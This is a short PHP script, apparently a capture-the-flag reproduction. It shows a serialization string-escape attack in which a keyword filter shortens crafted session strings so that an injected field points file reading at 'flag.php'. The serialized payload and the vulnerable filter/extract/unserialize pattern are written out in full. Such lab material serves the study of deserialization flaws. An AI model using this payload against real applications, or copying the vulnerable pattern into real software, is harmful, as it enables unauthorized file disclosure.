<?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$_SESSION["user"] = 'guestflagflagflagflagflagflag';
$_SESSION['function'] = '1";s:3:"img";s:12:"ZmxhZy5waHA=";s:8:"function";s:2:"sb";}';
$_SESSION['img'] = base64_encode('guest_img.png');
$serialize_info = filter(serialize($_SESSION));
extract($_POST);
echo $serialize_info;

// a:3:{s:4:"user";s:5:"guest";s:8:"function";N;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}

$userinfo = unserialize($serialize_info);
// echo file_get_contents(base64_decode($userinfo['img']));
?>